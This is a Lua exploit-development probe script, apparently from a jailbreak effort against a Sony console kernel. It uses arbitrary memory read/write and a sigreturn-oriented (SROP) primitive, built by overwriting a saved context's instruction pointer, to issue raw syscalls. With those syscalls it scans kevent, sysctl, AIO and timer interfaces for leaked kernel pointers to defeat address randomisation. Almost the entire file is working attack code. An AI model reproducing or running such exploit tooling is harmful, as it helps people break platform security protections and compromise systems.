-- CRASH_CLASS: LOW
-- PROBE 135c: Fix kevent + broader sysctl scan for kernel pointers
--
-- kevent failed in 135b due to bad struct setup (memory.write_word).
-- Fix: use write_dword/write_byte for struct fields.
-- Also: scan sysctl MIBs for kernel address leaks.

print("=== PROBE 135c: KEVENT + SYSCTL SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end

--------------------------------------------------------------------
-- SECTION A: kevent with fixed struct layout
--------------------------------------------------------------------
print("")
print("--- [A] kevent fixed ---")

local kq_fd = to_num(srop(362))
print("[A] kqueue fd=" .. kq_fd)

if kq_fd > 0 and kq_fd < 256 then
    local changelist = gpu + 0x100
    local eventlist = gpu + 0x300

    -- Build kevent struct using dword/byte writes
    -- struct kevent (32 bytes on amd64):
    --   +0x00: ident (8 bytes) = fd 4 (TCP socket)
    --   +0x08: filter (2 bytes, short) = EVFILT_READ = -1 = 0xFFFF
    --   +0x0A: flags (2 bytes, ushort) = EV_ADD = 1
    --   +0x0C: fflags (4 bytes) = 0
    --   +0x10: data (8 bytes) = 0
    --   +0x18: udata (8 bytes) = 0
    for off = 0, 0x1F, 4 do memory.write_dword(changelist + off, 0) end
    memory.write_qword(changelist, uint64(4))
    -- filter(0xFFFF) + flags(0x0001) as dword: little-endian = 0x0001FFFF
    memory.write_dword(changelist + 0x08, 0x0001FFFF)
    memory.write_dword(changelist + 0x0C, 0)

    for off = 0, 0x3F, 4 do memory.write_dword(eventlist + off, 0) end

    -- kevent(kq, changelist, 1, eventlist, 4, NULL)
    local rv_ke = srop(560,
        uint64(kq_fd), ua(changelist), uint64(1),
        ua(eventlist), uint64(4), uint64(0))
    print("[A] kevent rv=" .. hex(rv_ke))
    local keh, kel = get_hi_lo(rv_ke)

    if kel > 0 and kel < 100 then
        print("[A] " .. kel .. " events!")
        for i = 0, kel - 1 do
            local base = eventlist + (i * 0x20)
            local ident = memory.read_qword(base)
            local filt_flags = to_num(memory.read_dword(base + 0x08))
            local data = memory.read_qword(base + 0x10)
            local udata = memory.read_qword(base + 0x18)
            print(string.format("[A]   event: ident=%s ff=0x%08X data=%s udata=%s",
                hex(ident), filt_flags, hex(data), hex(udata)))
            local dh, dl = get_hi_lo(data)
            if dh >= 0xFFFF8000 and dh ~= 0xFFFFFFFF then
                print("[A]   *** KERNEL POINTER in data! ***")
            end
        end
    end

    -- Try EVFILT_PROC (-5) to monitor ourselves
    for off = 0, 0x1F, 4 do memory.write_dword(changelist + off, 0) end
    memory.write_qword(changelist, uint64(pid))
    -- filter=-5(0xFFFB), flags=EV_ADD(1) → dword = 0x0001FFFB
    memory.write_dword(changelist + 0x08, 0x0001FFFB)
    -- NOTE_EXIT = 0x80000000
    memory.write_dword(changelist + 0x0C, 0x80000000)

    for off = 0, 0x3F, 4 do memory.write_dword(eventlist + off, 0) end
    local rv_proc = srop(560,
        uint64(kq_fd), ua(changelist), uint64(1),
        ua(eventlist), uint64(1), uint64(0))
    print("[A] kevent(EVFILT_PROC)=" .. hex(rv_proc))

    -- Try EVFILT_SIGNAL (-6) for SIGUSR1
    for off = 0, 0x1F, 4 do memory.write_dword(changelist + off, 0) end
    memory.write_qword(changelist, uint64(30))  -- SIGUSR1
    memory.write_dword(changelist + 0x08, 0x0001FFFA)  -- EVFILT_SIGNAL=-6, EV_ADD

    for off = 0, 0x3F, 4 do memory.write_dword(eventlist + off, 0) end
    local rv_sig = srop(560,
        uint64(kq_fd), ua(changelist), uint64(1),
        ua(eventlist), uint64(1), uint64(0))
    print("[A] kevent(EVFILT_SIGNAL)=" .. hex(rv_sig))

    srop(6, uint64(kq_fd))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Broad sysctl scan for kernel pointers
--------------------------------------------------------------------
print("")
print("--- [B] sysctl scan ---")

local mib = gpu + 0x500
local outbuf = gpu + 0x600
local oldlenp = gpu + 0xE00

local function try_sysctl(name, m1, m2, m3, m4, mlen)
    memory.write_dword(mib, m1)
    if m2 then memory.write_dword(mib + 4, m2) end
    if m3 then memory.write_dword(mib + 8, m3) end
    if m4 then memory.write_dword(mib + 12, m4) end
    for off = 0, 0x1FF, 4 do memory.write_dword(outbuf + off, 0) end
    memory.write_qword(oldlenp, uint64(0x200))

    local rv = srop(202, ua(mib), uint64(mlen or 2),
        ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    local retlen = to_num(memory.read_qword(oldlenp))

    if rvl == 0 and rvh == 0 and retlen > 0 then
        print(string.format("[B] %s: %d bytes", name, retlen))
        -- Check for kernel pointers in output
        for off = 0, math.min(retlen, 0x100) - 4, 8 do
            local v = memory.read_qword(outbuf + off)
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                print(string.format("  *** KPTR at +0x%02X: %s ***", off, hex(v)))
            end
        end
        -- Print first value for context
        local v0 = memory.read_qword(outbuf)
        print(string.format("  [0]=%s", hex(v0)))
        return true
    end
    return false
end

-- CTL_KERN=1 variants
try_sysctl("kern.ostype", 1, 1)            -- os type string
try_sysctl("kern.osrelease", 1, 2)          -- os release string
try_sysctl("kern.osrev", 1, 3)              -- os revision
try_sysctl("kern.maxproc", 1, 6)            -- max processes
try_sysctl("kern.clockrate", 1, 12)         -- clock info
try_sysctl("kern.boottime", 1, 21)          -- boot time
try_sysctl("kern.osreldate", 1, 24)         -- os release date
try_sysctl("kern.ps_strings", 1, 32)        -- ps_strings addr!
try_sysctl("kern.usrstack", 1, 33)          -- user stack addr!
try_sysctl("kern.sched.name", 1, 50, 1)     -- scheduler name
try_sysctl("kern.hostname", 1, 10)          -- hostname

-- kern.proc variants with pid
try_sysctl("kern.proc.args", 1, 14, 7, pid, 4)  -- process args
try_sysctl("kern.proc.env", 1, 14, 17, pid, 4)  -- process env
try_sysctl("kern.proc.auxv", 1, 14, 16, pid, 4) -- aux vector!
try_sysctl("kern.proc.rlimit", 1, 14, 37, pid, 4)
try_sysctl("kern.proc.groups", 1, 14, 15, pid, 4)

-- CTL_HW=6
try_sysctl("hw.machine", 6, 1)
try_sysctl("hw.model", 6, 2)
try_sysctl("hw.ncpu", 6, 3)
try_sysctl("hw.physmem", 6, 5)
try_sysctl("hw.usermem", 6, 6)
try_sysctl("hw.pagesize", 6, 7)

-- CTL_VM=2
try_sysctl("vm.loadavg", 2, 2)

print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: AIO syscalls (not sys 661!)
--------------------------------------------------------------------
print("")
print("--- [C] AIO syscalls ---")

-- aio_read(255), aio_write(256), aio_return(314), aio_error(317)
-- These are POSIX AIO, NOT Sony sys 661

-- struct aiocb
local aiocb = gpu + 0xF00
for off = 0, 0xFF, 4 do memory.write_dword(aiocb + off, 0) end
-- aio_fildes = fd 4 (TCP socket)
memory.write_dword(aiocb + 0, 4)
-- aio_buf = outbuf
memory.write_qword(aiocb + 0x10, ua(outbuf))
-- aio_nbytes = 16
memory.write_qword(aiocb + 0x18, uint64(16))

local rv_ar = srop(255, ua(aiocb))
print("[C] aio_read(255)=" .. hex(rv_ar))

local rv_aw = srop(256, ua(aiocb))
print("[C] aio_write(256)=" .. hex(rv_aw))

-- lio_listio(392)
local rv_lio = srop(392, uint64(1), ua(aiocb), uint64(1))
print("[C] lio_listio(392)=" .. hex(rv_lio))

print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: timer_create via SROP
--------------------------------------------------------------------
print("")
print("--- [D] ktimer ---")

-- timer_create(232): clockid, evp, timerid
local timerid = gpu + 0xF80
memory.write_dword(timerid, 0xFFFFFFFF)
local rv_tc = srop(232, uint64(0), uint64(0), ua(timerid))
print("[D] timer_create=" .. hex(rv_tc))
print("[D] timerid=" .. to_num(memory.read_dword(timerid)))

-- If timer created, try timer_settime
local tid = to_num(memory.read_dword(timerid))
if tid >= 0 and tid < 1000 and to_num(rv_tc) == 0 then
    -- struct itimerspec: it_interval{tv_sec,tv_nsec}, it_value{tv_sec,tv_nsec}
    local its = gpu + 0xFC0
    memory.write_qword(its, uint64(0))       -- interval sec
    memory.write_qword(its + 8, uint64(0))   -- interval nsec
    memory.write_qword(its + 0x10, uint64(1)) -- value sec = 1
    memory.write_qword(its + 0x18, uint64(0)) -- value nsec

    local rv_ts = srop(235, uint64(tid), uint64(0), ua(its))
    print("[D] timer_settime=" .. hex(rv_ts))

    -- timer_delete(236)
    local rv_td = srop(236, uint64(tid))
    print("[D] timer_delete=" .. hex(rv_td))
end
print("[D] pid=" .. to_num(sc20()))

print("")
print("=== DONE ===")
